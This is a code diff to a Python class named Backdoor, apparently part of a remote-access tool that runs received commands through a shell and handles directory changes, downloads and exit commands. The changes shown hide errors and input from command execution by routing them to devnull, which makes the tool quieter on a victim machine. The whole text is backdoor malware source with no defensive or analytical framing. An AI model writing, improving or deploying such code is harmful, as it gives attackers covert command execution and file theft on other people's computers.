@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json, os
+import socket, subprocess, json, os, sys
 import base64
 
 class Backdoor:
@@ -22,7 +22,9 @@ class Backdoor:
                 continue
 
     def execute_system_command(self,command):
-        return subprocess.check_output(command, shell=True)
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+        #if python3 use - return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -45,7 +47,7 @@ class Backdoor:
 
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
